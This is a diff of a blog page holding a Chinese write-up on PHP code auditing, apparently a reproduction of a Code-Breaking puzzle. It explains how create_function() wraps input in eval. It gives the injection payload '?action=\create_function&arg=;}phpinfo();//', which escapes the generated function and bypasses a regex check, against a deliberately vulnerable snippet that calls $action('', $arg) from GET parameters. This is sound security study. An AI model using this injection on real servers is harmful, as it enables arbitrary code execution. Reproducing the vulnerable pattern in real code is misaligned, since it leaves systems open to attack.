@@ -3,7 +3,7 @@
   <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
     
-    <title>archive_a | Xiao Leung&#39;s Blog</title>
+    <title>代码审计-Create_function()函数 | Xiao Leung&#39;s Blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
     
@@ -74,125 +74,94 @@
 <!--文章列表-->
 <div class="wrapper">
   
-    <ul class="posts-list mb+ js-posts">
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-            <i class="post-status iconfont icon-icon"></i>  
-          
-          <h2 class="no-background"  >
-            <span><a href="/2019/08/27/2019-8-27-X-NUCA‘2019-Ezphp复现总结/">X-NUCA‘2019 ——Ezphp复盘总结</a></span>
-            <time class="post-time" datetime="2019-08-27T05:15:01.000Z" itemprop="datePublished">2019-08-27</time>
-          </h2>
-        </li>
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-          <h2 class="no-background"  >
-            <span><a href="/2019/08/26/HEXO+Git/">HEXO+Githubpage搭建博客</a></span>
-            <time class="post-time" datetime="2019-08-26T13:14:11.000Z" itemprop="datePublished">2019-08-26</time>
-          </h2>
-        </li>
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-          <h2 class="no-background"  >
-            <span><a href="/2019/08/25/SSRF学习总结 /">SSRF学习笔记</a></span>
-            <time class="post-time" datetime="2019-08-25T09:51:44.000Z" itemprop="datePublished">2019-08-25</time>
-          </h2>
-        </li>
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-          <h2 class="no-background"  >
-            <span><a href="/2019/08/25/Easy-PHP-Write-up/">SUCTF-Easy-PHP笔记</a></span>
-            <time class="post-time" datetime="2019-08-25T09:51:44.000Z" itemprop="datePublished">2019-08-25</time>
-          </h2>
-        </li>
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-          <h2 class="no-background"  >
-            <span><a href="/2019/08/15/Python沙箱逃逸学习笔记/">Python沙箱逃逸学习笔记</a></span>
-            <time class="post-time" datetime="2019-08-15T04:51:44.000Z" itemprop="datePublished">2019-08-15</time>
-          </h2>
-        </li>
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-          <h2 class="no-background"  >
-            <span><a href="/2019/08/09/上传漏洞&文件包含总结/">上传漏洞&amp;文件包含总结</a></span>
-            <time class="post-time" datetime="2019-08-09T02:05:54.000Z" itemprop="datePublished">2019-08-09</time>
-          </h2>
-        </li>
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-          <h2 class="no-background"  >
-            <span><a href="/2019/08/04/SQl注入学习笔记/">SQL注入学习笔记</a></span>
-            <time class="post-time" datetime="2019-08-04T02:05:54.000Z" itemprop="datePublished">2019-08-04</time>
-          </h2>
-        </li>
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-          <h2 class="no-background"  >
-            <span><a href="/2019/08/01/HelloWorld/">关于我</a></span>
-            <time class="post-time" datetime="2019-08-01T09:51:44.000Z" itemprop="datePublished">2019-08-01</time>
-          </h2>
-        </li>
-      
-    </ul>
-    
-      <div class="pagination mb+ js-pagination">
-        <div class="js-next pagination__load">
-            
-        </div>
-    </div>
-    
+    <!--文章-->
+<article>
+	
+  
+    <h1 class="post-title" itemprop="name">
+      代码审计-Create_function()函数
+    </h1>
+  
+
+	<div class='post-body mb'>
+		<h2 id="代码审计-Create-function-函数"><a href="#代码审计-Create-function-函数" class="headerlink" title="代码审计-Create_function()函数"></a>代码审计-Create_function()函数</h2><h4 id="create-function-函数创建匿名函数的使用例子："><a href="#create-function-函数创建匿名函数的使用例子：" class="headerlink" title="create_function()函数创建匿名函数的使用例子："></a>create_function()函数创建匿名函数的使用例子：</h4><pre><code class="php">&lt;?php
+$fun = create_function(&#39;$a,$b&#39;,&#39;return $a+$b;&#39;);
+echo $fun(1,2);
+?&gt;</code></pre>
+<ul>
+<li>预测结果就是答应一个3:</li>
+</ul>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191023/15718423282417.png" alt="img"></p>
+<ul>
+<li>还原一下它的执行过程</li>
+</ul>
+<pre><code class="php">eval(
+&quot;
+function fun($a,$b){
+    return $a+$b;
+}
+&quot;
+);</code></pre>
+<ul>
+<li>这个过程就很明显了，要想执行其他函数，先从function中逃逸出来，直接构造：<code>;}phpinfo();//</code>即可逃逸出来</li>
+</ul>
+<h4 id="其他构造匿名函数的方法"><a href="#其他构造匿名函数的方法" class="headerlink" title="其他构造匿名函数的方法"></a>其他构造匿名函数的方法</h4><pre><code class="php">&lt;?php
+$calc =function() use ($a,$b){
+    return $a+$b;
+}
+$calc(1,2);
+?&gt;</code></pre>
+<h4 id="典例："><a href="#典例：" class="headerlink" title="典例："></a>典例：</h4><pre><code class="php">&lt;?php
+$action = $_GET[&#39;action&#39;] ?? &#39;&#39;;
+$arg = $_GET[&#39;arg&#39;] ?? &#39;&#39;;
+
+if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action)) {
+    show_source(__FILE__);
+} else {
+    $action(&#39;&#39;, $arg);
+}</code></pre>
+<p>有上面的知识铺垫，那么这里不难想出使用create_funtion,构造payload:<code>?action=\create_function&amp;arg=;}phpinfo();//</code>，<code>create_function</code>前面加上<code>\</code>可以直接绕过这个正则,因为这个正则是由字母或数字开始匹配其他内容，所以前面加上一个\可以直接绕过这个正则，但是只能用<code>\</code>其他的会无法找到该函数，具体原因如下。</p>
+<p> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215175719-cf670570-004f-1.png" alt="img"> </p>
+
+	</div>
+	<div class="meta split">
+		
+			<span>本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次</span>
+		
+		<time class="post-date" datetime="2019-10-23T14:04:07.000Z" itemprop="datePublished">2019-10-23</time>
+	</div>
+</article>
+
+<!--评论-->
+
+	
+<div class="ds-thread" data-thread-key="复现 Code-Breaking Puzzles -easy - function-" data-title="代码审计-Create_function()函数" data-url="http://www.plasf.cn/2019/10/23/复现 Code-Breaking Puzzles -easy - function-/"></div>
+<script type="text/javascript">
+
+var duoshuoQuery = {short_name:"yumemor"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0]
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+</script>
+
 
   
 </div>
+
+
+  <svg id="bigTriangleColor" width="100%" height="40" viewBox="0 0 100 102" preserveAspectRatio="none">
+    <path d="M0 0 L50 100 L100 0 Z"></path>
+  </svg>
+
+  
+
+
+  <div class="wrapper"></div>
 
 
 
